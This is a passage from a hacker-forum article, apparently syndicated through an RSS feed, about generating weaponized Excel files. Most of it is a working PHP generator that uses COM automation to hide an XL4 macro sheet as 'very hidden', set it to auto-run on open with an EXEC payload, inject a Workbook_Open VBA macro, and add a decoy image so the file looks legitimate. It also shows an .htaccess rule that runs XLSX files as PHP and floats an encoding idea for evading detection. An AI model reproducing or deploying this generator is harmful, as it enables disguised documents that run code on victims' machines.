<span alt="image" data-base62-sha1="mJUIX89AWJuzTcqVTPtJjD114dp" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<pre><code class="lang-php">$WS = $WB-&gt;Worksheets[1];
Sleep(60);
printf("Formula: %s&lt;br&gt;Value: %s", $WS-&gt;Cells[1][1]-&gt;Formula, $WS-&gt;Cells[1][1]-&gt;Value);
</code></pre>
<p><span alt="image" data-base62-sha1="vOOoZtHcQh3kYR8nUHrgpPKx4gy" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Ultimately, cells can be accessed as a 2-dimensional array starting with Index = 1.<br>
We can easily simulate that within our PHP script:</p>
<pre><code class="lang-php">$M2-&gt;Cells[3][2]-&gt;Select(); // [Column][Row] Indexing
</code></pre>
<p><span alt="image" data-base62-sha1="o0PhcxsiXwFaNfJ0Dk3z6WXbnTV" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<pre><code class="lang-php">$M2-&gt;Cells(3, 2)-&gt;Select(); // (Row, Column) Indexing
</code></pre>
<p><span alt="image" data-base62-sha1="g3qVYNCW4dwyQJYJ6SmbT3g4Rwx" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Next, the <em>ClearContents</em> procedure role (DISPID=113) clears both the value and an underlying formula of a specified cell.</p>
<h3>Putting it all together</h3>
<p>Putting all that prior theory together we can create a simple PoC with the following snippets below.</p>
<p>Let’s define two payloads <code>0000</code> and <code>0001</code> in form of <code>.vbs</code> scripts as follows:</p>
<pre><code class="lang-auto"># 0000.vbs
=EXEC("calc")
=HALT()
</code></pre>
<pre><code class="lang-auto"># 0001.vbs
Sub Workbook_Open()
	MsgBox "AAAA"
End Sub
</code></pre>
<p>A simple <em>NUExcel.php</em> library that generates documents could look as follows:</p>
<pre><code class="lang-auto">&lt;?php
define('xlExcel8', 56);
define('xlExcel4IntlMacroSheet', 4);

define('xlSheetHidden', 0);
define('xlSheetVeryHidden', 2);
define('xlSheetVisible', -1);

define('CDirectory', getcwd());
define('Payloads', glob("payloads/*.vbs", GLOB_NOSORT));

class DirtyDebug
{
	function DisplayElements($Object)
	{
		$Info = com_print_typeinfo($Object);
		print($Object);
	}
}

class NUExcel extends DirtyDebug
{
	private $XL, $WB;
	public  $Name;
	
	function RName()
	{
		$this-&gt;Name = sprintf("%s/doc%d.xls", CDirectory, rand(1, 14782));
	}
	
	function CreateInstance($Visible = FALSE)
	{
		$this-&gt;XL = new COM('Excel.Application') or die(0);
		$this-&gt;WB = $this-&gt;XL-&gt;Workbooks-&gt;Add();
		
		$this-&gt;XL-&gt;Visible = $Visible;
		$this-&gt;XL-&gt;DisplayAlerts = FALSE;
		
		return TRUE;
	}
	
	function EndInstance($Save = TRUE)
	{
		if ($Save)
		{
			$this-&gt;RName();
			$this-&gt;WB-&gt;SaveAs($this-&gt;Name, xlExcel8);
		}
		
		$this-&gt;WB-&gt;Close();
		$this-&gt;XL-&gt;Quit();
	}
	
	function CreateXL4Sheet()
	{
		$WC = $this-&gt;WB-&gt;Worksheets;
		return $WC-&gt;Add(NULL, NULL, 1, xlExcel4IntlMacroSheet);
	}
	
	function XL4MacroVisibility($MSheet, $Code)
	{
		if($MSheet &amp;&amp; in_array($Code, array(xlSheetHidden, xlSheetVeryHidden, xlSheetVisible)))
		{
			$MSheet-&gt;Visible = $Code;
		}
	}
	
	function GetCell($Sheet, $RNum, $CNum)
	{
		return $Sheet-&gt;Cells($RNum, $CNum);
	}
	
	function GetSetCellData($Cell, $Formule = TRUE, $Data = '')
	{
		$Get = TRUE;
		
		if(strlen($Data))
			$Get = FALSE;
		
		if($Formule)
		{
			if($Get)
				return $Cell-&gt;Formula;
			
			$Cell-&gt;Formula = $Data;
		}
		else
		{
			if($Get)
				return $Cell-&gt;Value;
			
			$Cell-&gt;Value = $Data;
		}
		
		return;
	}
	
	function PayloadName($Index)
	{
		$Name = NULL;
		
		if($Index &gt;= 0 &amp;&amp; $Index &lt; count(Payloads))
		{
			$Name = Payloads[$Index];
		}
		
		return $Name;
	}
	
	function WriteXL4Payload($MSheet, $FNum, $CNum = 1, $RNum = 1)
	{
		$F = $this-&gt;PayloadName($FNum);
		if (! $F)
			return;
		
		if(($Handle = fopen($F, 'r')) != FALSE)
		{	
			do
			{
				$this-&gt;GetSetCellData($this-&gt;GetCell($MSheet, $RNum++, $CNum), TRUE, trim(fgets($Handle)));
			} while(! feof($Handle));
		}	
	}
	
	function ClearXL4Row($MSheet, $CNum = 1, $RNum = 1)
	{
		while(($Cell = $this-&gt;GetCell($MSheet, $this-&gt;$RNum++, $CNum)) &amp;&amp; strlen($this-&gt;GetSetCellData($Cell, FALSE)))
		{
			$Cell-&gt;ClearContents();
		}
		return TRUE;
	}
	
	function RunMacro($MName)
	{
		return $this-&gt;XL-&gt;Run($MName);
	}
	
	function SetCellName($Sheet, $CNum, $RNum, $CName)
	{
		$this-&gt;GetCell($Sheet, $RNum, $CNum)-&gt;Name = $CName;
	}
	
	function GetComponents()
	{
		return $this-&gt;WB-&gt;VBProject-&gt;VBComponents;
	}
	
	function WriteVBAPayload($FNum)
	{
		$F = $this-&gt;PayloadName($FNum);
		if (! $F)
			return;
		
		$CM = $this-&gt;GetComponents();
		$CN = $this-&gt;WB-&gt;CodeName;
			
		if(! empty($CN))
		{
			$Module = $CM[$CN]-&gt;CodeModule;
			$Module-&gt;AddFromFile(realpath($F));
			$Module-&gt;AddFromString(chr(32));
		}
	}
	
	function GetWorksheet($Index)
	{
		$WS = $this-&gt;WB-&gt;Worksheets;
		if($WS-&gt;Count &gt;= $Index)
			return $WS[$Index];
		return NULL;
	}
	
	function InsertPicture($Sheet, $File, $Width = -1, $Height = -1)
	{
		if($Sheet)
			$Sheet-&gt;Shapes-&gt;AddPicture(realpath($File), FALSE, TRUE, 0, 0, $Width, $Height);
	}
}
?&gt;
</code></pre>
<p>Our main routine importing our written library results in a rather short script!</p>
<pre><code class="lang-php">&lt;?php
include 'NUExcel.php';

function Main()
{
	$NEntry = new NUExcel;
	$NEntry-&gt;CreateInstance(TRUE);
	$MS = $NEntry-&gt;CreateXL4Sheet();
	$NEntry-&gt;WriteXL4Payload($MS, 0);
	$NEntry-&gt;SetCellName($MS, 1, 1, "Auto_Ouvrir"); // Auto_Open
	$NEntry-&gt;XL4MacroVisibility($MS, xlSheetVeryHidden);
	$NEntry-&gt;WriteVBAPayload(1);
	$NEntry-&gt;InsertPicture($NEntry-&gt;GetWorksheet(1), "images/image.png");
	$NEntry-&gt;EndInstance();
	
	if($NEntry-&gt;Name)
	{
		printf("File at: %s", $NEntry-&gt;Name);
	}
}

Main();
?&gt;
</code></pre>
<p>The result is the following file:<br>
<span alt="image" data-base62-sha1="5jBUOocpXIbUJ539SoflmBdjCaJ" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Obviously, it’s totally legit looking! <img src="https://0x00sec.org/images/emoji/twitter/hugs.png?v=9" title=":hugs:" class="emoji" alt=":hugs:"><br>
<span alt="image" data-base62-sha1="t5DtqSanyWLAI0CV2kIDlyo1wxE" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
–<br>
<span alt="image" data-base62-sha1="xYA97Jnwz1iX471XJ3jKrQ9HTs4" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span> || <span alt="image" data-base62-sha1="u4qcdZiSRMWAWw1LX79ia4VZDOu" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
We can use the .htaccess file to process a XLSX file as PHP.</p>
<pre><code class="lang-auto">AddHandler application/x-httpd-php .xlsx
</code></pre>
<p><span alt="image" data-base62-sha1="iRTTDQarv4X7niq3ebJOto9pOHo" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<h3>Final thoughts</h3>
<p><em>There is not much left to be said.<br>
However, an idea will await a passionate individual that’ll make it a reality.<br>
Will it be you?</em></p>
<p><em>VBA Pervertor: A generator of random reversible-sequence of arithmetic operations(<strong>XOR, ADD, SUB, etc</strong>) to encode individual bytes.</em></p>
<h3>Inspirations</h3>
<p><em>“Ma dimmi cosa resta in questa stanza quando la luce si spegne?<br>
Niente.”</em></p>
<p><a href="https://vxug.fakedoma.in/zines/29a/29a8/Articles/29A-8.005.txt" rel="nofollow noopener"><em>Pervert world wide - Z0MBiE/29A</em></a><br>
<a href="https://dl.packetstormsecurity.net/papers/bypass/PolymorphicEvasion.txt" rel="nofollow noopener"><em>On Polymorphic Evasion - Phantasmal Phantasmagoria</em></a><br>
<a href="https://en.wikipedia.org/wiki/Al-Kindi" rel="nofollow noopener"><em>On First Philosophy - Al-Kindi</em></a><br>
<a href="https://en.wikipedia.org/wiki/Amand-Marie-Jacques_de_Chastenet,_Marquis_of_Puys%C3%A9gur" rel="nofollow noopener"><em>Marquis de Puységur</em></a></p>
<h3>Thanks</h3>
<p><em>To my father without whom this article wouldn’t have been possible to write.<br>
To Da, To, <strong>Pr</strong>, Ad, Ka, Mwo, Mt, Pw, Xl, Zi, Mz (y’all know who you are)</em>;</p>
<p><strong>To <a class="mention" href="https://0x00sec.org/u/ricksanchez">@ricksanchez</a> who made the article a million times better!</strong> <img src="https://0x00sec.org/images/emoji/twitter/heart.png?v=9" title=":heart:" class="emoji" alt=":heart:"><br>
To <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a>, <a class="mention" href="https://0x00sec.org/u/cry0l1t3">@Cry0l1t3</a> for not hesitating to offer help.<br>
To <a class="mention" href="https://0x00sec.org/u/jeff">@jeff</a> for the the encouragement.<br>
To <a class="mention" href="https://0x00sec.org/u/leeky">@Leeky</a>, <a class="mention" href="https://0x00sec.org/u/_py">@_py</a>, <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a>, <a class="mention" href="https://0x00sec.org/u/danus">@Danus</a>  and all of 0x00sec for being amazing peoples.</p>
<h3>End</h3>
<p><em><code>Limits are there to be broken, expectations to be surpassed, existence to be proved.</code></em></p>
<p><em>I am the nobody.<br>
I am an addict.<br>
I am madness personified.</em><br>
~ exploit (out)</p>
          <p><a href="https://0x00sec.org/t/excel-primi-passi/20458/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/excel-primi-passi/20458/1</link>
        <pubDate>Sun, 12 Apr 2020 17:17:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20458-1</guid>
        <source url="https://0x00sec.org/t/excel-primi-passi/20458.rss">Excel | Primi passi</source>
      </item>
  </channel>
</rss>
